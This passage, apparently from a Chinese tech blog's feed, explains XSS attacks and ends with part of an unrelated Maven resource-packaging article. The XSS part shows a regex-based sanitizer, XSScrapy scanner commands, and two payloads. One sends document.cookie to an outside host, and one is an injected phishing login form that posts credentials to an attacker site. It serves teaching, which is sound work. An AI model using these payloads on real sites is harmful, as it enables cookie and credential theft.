class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">cleanXSS</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//You&#x27;ll need to remove the spaces from the html entities below</span></span><br><span class="line">    value = value.replaceAll(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp; lt;&quot;</span>).replaceAll(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp; gt;&quot;</span>);</span><br><span class="line">    value = value.replaceAll(<span class="string">&quot;\\(&quot;</span>, <span class="string">&quot;&amp; #40;&quot;</span>).replaceAll(<span class="string">&quot;\\)&quot;</span>, <span class="string">&quot;&amp; #41;&quot;</span>);</span><br><span class="line">    value = value.replaceAll(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&amp; #39;&quot;</span>);</span><br><span class="line">    value = value.replaceAll(<span class="string">&quot;eval\\((.*)\\)&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    value = value.replaceAll(<span class="string">&quot;[\\\&quot;\\\&#x27;][\\s]*javascript:(.*)[\\\&quot;\\\&#x27;]&quot;</span>, <span class="string">&quot;\&quot;\&quot;&quot;</span>);</span><br><span class="line">    value = value.replaceAll(<span class="string">&quot;script&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-一款XSS漏洞检测爬虫-XSScrapy"><a href="#0x04-一款XSS漏洞检测爬虫-XSScrapy" class="headerlink" title="0x04 一款XSS漏洞检测爬虫 - XSScrapy"></a>0x04 一款XSS漏洞检测爬虫 - XSScrapy</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./xsscrapy.py -u http://example.com</span><br><span class="line">./xsscrapy.py -u http://example.com/login_page -l loginname</span><br></pre></td></tr></table></figure><h2 id="0x05-XSS练习"><a href="#0x05-XSS练习" class="headerlink" title="0x05 XSS练习"></a>0x05 XSS练习</h2><p><a href="http://vulnweb.janusec.com/index-xss.php">http://vulnweb.janusec.com/index-xss.php</a></p><h2 id="0x06-推荐站点"><a href="#0x06-推荐站点" class="headerlink" title="0x06 推荐站点"></a>0x06 推荐站点</h2><ul><li><a href="http://drops.wooyun.org/">WooYun知识库</a></li><li><a href="http://www.freebuf.com/">FreeBuf黑客与极客</a></li><li><a href="http://www.sec-wiki.com/index.php">SecWiki</a></li></ul><h2 id="0x07-参考文档"><a href="#0x07-参考文档" class="headerlink" title="0x07 参考文档"></a>0x07 参考文档</h2><ul><li><a href="http://www.freebuf.com/articles/web/40520.html">XSS的原理分析与解剖</a></li><li><a href="http://www.freebuf.com/articles/web/42727.html">XSS的原理分析与解剖（第二篇）</a></li><li><a href="http://drops.wooyun.org/web/13009">前端防御XSS</a></li><li><a href="http://www.cnblogs.com/Mainz/archive/2012/11/01/2749874.html">Spring MVC防御CSRF、XSS和SQL注入攻击</a></li><li><a href="http://itindex.net/detail/51089-xss-xsscrapy">快速、直接的XSS漏洞检测爬虫 – XSScrapy</a></li><li><a href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/xss.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;XSS 全称(Cross Site Scripting) 跨站脚本攻击，是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。比如获取用户的Cookie，导航到恶意网站,携带木马等。&lt;/p&gt;
&lt;h2 id=&quot;0x01-XSS攻击的分类&quot;&gt;&lt;a href=&quot;#0x01-XSS攻击的分类&quot; class=&quot;headerlink&quot; title=&quot;0x01 XSS攻击的分类&quot;&gt;&lt;/a&gt;0x01 XSS攻击的分类&lt;/h2&gt;&lt;p&gt;根据XSS脚本注入方式的不同，我们可以对XSS攻击进行简单的分类。其中，最常见的就数反射型XSS和存储型XSS了。&lt;/p&gt;
&lt;h3 id=&quot;1-反射型XSS&quot;&gt;&lt;a href=&quot;#1-反射型XSS&quot; class=&quot;headerlink&quot; title=&quot;1. 反射型XSS&quot;&gt;&lt;/a&gt;1. 反射型XSS&lt;/h3&gt;&lt;p&gt;反射型XSS，又称非持久型XSS。之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式具有一次性。&lt;br&gt;攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。&lt;/p&gt;
&lt;h3 id=&quot;2-存储型XSS&quot;&gt;&lt;a href=&quot;#2-存储型XSS&quot; class=&quot;headerlink&quot; title=&quot;2. 存储型XSS&quot;&gt;&lt;/a&gt;2. 存储型XSS&lt;/h3&gt;&lt;p&gt;存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。&lt;/p&gt;
&lt;h2 id=&quot;0x02-XSS攻击的手段及其危害&quot;&gt;&lt;a href=&quot;#0x02-XSS攻击的手段及其危害&quot; class=&quot;headerlink&quot; title=&quot;0x02 XSS攻击的手段及其危害&quot;&gt;&lt;/a&gt;0x02 XSS攻击的手段及其危害&lt;/h2&gt;&lt;h3 id=&quot;1-窃取Cookie&quot;&gt;&lt;a href=&quot;#1-窃取Cookie&quot; class=&quot;headerlink&quot; title=&quot;1. 窃取Cookie&quot;&gt;&lt;/a&gt;1. 窃取Cookie&lt;/h3&gt;&lt;p&gt;具体实现方法：&lt;br&gt;先构造语句&lt;code&gt;&amp;lt;script&amp;gt;window.open(&amp;#39;http://dlgyi.rrvv.net/cookie.asp?msg=&amp;#39;+document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;br&gt;这句话意思是打开一个新的窗口，访问&lt;a href=&quot;http://dlgyi.rrvv.net/cookie.asp%E8%BF%99%E4%B8%AA%E7%BD%91%E5%9D%80%EF%BC%8C%E5%B9%B6%E4%B8%94%E9%80%9A%E8%BF%87msg%E4%BC%A0%E9%80%92%E4%B8%80%E4%B8%AA%E5%8F%98%E9%87%8F%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E5%8F%98%E9%87%8F%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E8%A6%81%E6%94%B6%E9%9B%86%E7%9A%84cookie%E4%BA%86%E3%80%82&quot;&gt;http://dlgyi.rrvv.net/cookie.asp这个网址，并且通过msg传递一个变量，这里的变量就是我们要收集的cookie了。&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;2-引导钓鱼&quot;&gt;&lt;a href=&quot;#2-引导钓鱼&quot; class=&quot;headerlink&quot; title=&quot;2. 引导钓鱼&quot;&gt;&lt;/a&gt;2. 引导钓鱼&lt;/h3&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;hack&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;                   location.replace(“http:&lt;span class=&quot;comment&quot;&gt;//www.attackpage.com/record.asp?username=“&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;+&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.forms[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].user.value + “password=” + &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.forms[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].pass.value);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;HR&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;H3&lt;/span&gt;&amp;gt;&lt;/span&gt;这个功能需要登录:&amp;lt;/H3 &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;请输入用户名：&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;”text”&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;”user”name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;”user”&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;请输入密码：&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;”password”&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt; =&lt;span class=&quot;string&quot;&gt;“pass”&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;”submit”name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;”login”&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;”登录”onclick&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;”hack()”&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;HR&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。&lt;/p&gt;</summary>
    
    
    
    <category term="信息安全" scheme="http://yeshaoting.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XSS" scheme="http://yeshaoting.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>maven不同环境资源文件打包</title>
    <link href="http://yeshaoting.cn/article/java/maven%E4%B8%8D%E5%90%8C%E7%8E%AF%E5%A2%83%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85/"/>
    <id>http://yeshaoting.cn/article/java/maven%E4%B8%8D%E5%90%8C%E7%8E%AF%E5%A2%83%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85/</id>
    <published>2016-03-09T07:39:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/maven.png" class="img-logo img-center" /><h2 id="一、资源结构"><a href="#一、资源结构" class="headerlink" title="一、资源结构"></a>一、资源结构</h2><p>maven工程资源结构如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:jvwa yeshaoting$ tree src/main/resources/</span><br><span class="line">src/main/resources/</span><br><span class="line">├── app-db.properties</span><br><span class="line">├── app.properties</span><br><span class="line">├── dev</span><br><span class="line">│   ├── app-db.properties</span><br><span class="line">│   └── app.properties</span><br><span class="line">├── file</span><br><span class="line">│   ├── image.jpg</span><br><span class="line">│   └── stage6.jsp</span><br><span class="line">├── log4j.properties</span><br><span class="line">├── model</span><br><span class="line">│   └── UserMapper.xml</span><br><span class="line">├── prod</span><br><span class="line">│   ├── app-db.properties</span><br><span class="line">│   └── app.properties</span><br><span class="line">├── spring-beans.xml</span><br><span class="line">├── spring-db.xml</span><br><span class="line">└── spring-mvc.xml</span><br><span class="line"></span><br><span class="line">4 directories, 13 files</span><br></pre></td></tr></table></figure><h2 id="二、需求"><a href="#二、需求" class="headerlink" title="二、需求"></a>二、需求</h2><p>服务部署时，希望针对于不同的环境，使用不同的配置文件。<br>针对于当前工程而言，变化的配置文件为app.properties和app-db.properties。</p><p>本地环境使用：src/main/resources/ 目录下的这二个文件。<br>测试环境使用：src/main/resources/dev 目录下的这二个文件。<br>生产环境使用：src/main/resources/prod 目录下的这二个文件。</p><span id="more"></span><h2 id="三、解决方案"><a href="#三、解决方案" class="headerlink" title="三、解决方案"></a>三、解决方案</h2><p>借助maven-resources-plugin插件，在pom.xml指定配置。<br>打包时，通过 mvn clean package -Pdev 来执行对应的环境资源拷贝工作。</p><p>具体配置如下：</p><h3 id="1-基本配置"><a href="#1-基本配置" class="headerlink" title="1. 基本配置"></a>1. 基本配置</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>dev<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">id</span>&gt;</span>copy-resources<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">phase</span>&gt;</span>validate<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">goal</span>&gt;</span>copy-resources<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                  <span class="comment">&lt;!-- 指定resources插件处理资源文件到哪个目录下 --&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.build.outputDirectory&#125;<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">                  <span class="comment">&lt;!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） &lt;outputDirectory&gt;target/classes&lt;/outputDirectory&gt; --&gt;</span></span><br><span class="line">                  <span class="comment">&lt;!-- 待处理的资源定义 --&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                      <span class="comment">&lt;!-- 指定resources插件处理哪个目录下的资源文件 --&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources/dev<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                      <span class="comment">&lt;!-- 指定不需要处理的资源 &lt;excludes&gt; &lt;exclude&gt;WEB-INF/*.*&lt;/exclude&gt; &lt;/excludes&gt; --&gt;</span></span><br><span class="line">                      <span class="comment">&lt;!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟&lt;build&gt;&lt;resources&gt;&lt;resource&gt;下配置的资源过滤是一样的，只不过可能执行的阶段不一样，这里执行的阶段是插件指定的validate阶段，&lt;build&gt;&lt;resources&gt;&lt;resource&gt;下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) --&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">inherited</span>&gt;</span><span class="tag">&lt;/<span class="name">inherited</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-改进配置"><a href="#2-改进配置" class="headerlink" title="2. 改进配置"></a>2. 改进配置</h3><p>对于上面的配置，如果有prod, dev, local三类环境的话，则需要在对应的profile节点下添加三次build的配置。我们可以观察到针对不同的环境只是directory节点内容不同而已，可以使用一个变更代替就好了。</p><p>我们在profile节点下添加properties属性，使用<code>deploy.env</code>来代替不同的环境目录名。于是改进后的配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>dev<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">deploy.env</span>&gt;</span>dev<span class="tag">&lt;/<span class="name">deploy.env</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>prod<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">deploy.env</span>&gt;</span>prod<span class="tag">&lt;/<span class="name">deploy.env</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>copy-resources<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">phase</span>&gt;</span>validate<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">goal</span>&gt;</span>copy-resources<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">              <span class="comment">&lt;!-- 指定resources插件处理资源文件到哪个目录下 --&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.build.outputDirectory&#125;<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">              <span class="comment">&lt;!-- 